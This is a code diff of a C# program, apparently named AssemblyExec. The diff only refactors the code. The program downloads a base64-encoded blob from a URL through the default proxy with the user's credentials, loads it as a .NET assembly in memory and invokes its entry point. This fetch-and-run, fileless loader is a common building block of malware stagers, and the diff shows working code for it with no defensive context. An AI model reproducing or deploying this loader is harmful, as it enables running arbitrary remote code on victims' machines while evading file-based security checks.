@@ -12,17 +12,14 @@ namespace AssemblyExec
         {
             System.Net.IWebProxy defaultWebProxy = System.Net.WebRequest.DefaultWebProxy;
             defaultWebProxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
-            string textfromfile = (new System.Net.WebClient() { Proxy = defaultWebProxy }).DownloadString(url);
-            byte[] blob = Convert.FromBase64String(textfromfile);
-            return blob;
+            return Convert.FromBase64String((new System.Net.WebClient() { Proxy = defaultWebProxy }).DownloadString(url));
         }
 
         private static void Exec(byte[] a, string[] param)
         {
             Assembly ass = Assembly.Load(a);
             MethodInfo meth = ass.EntryPoint;
-            object[] args = new[] { param };
-            _ = meth.Invoke(null, args);
+            _ = meth.Invoke(null, new[] { param });
         }
         static void Main(string[] args)
         {
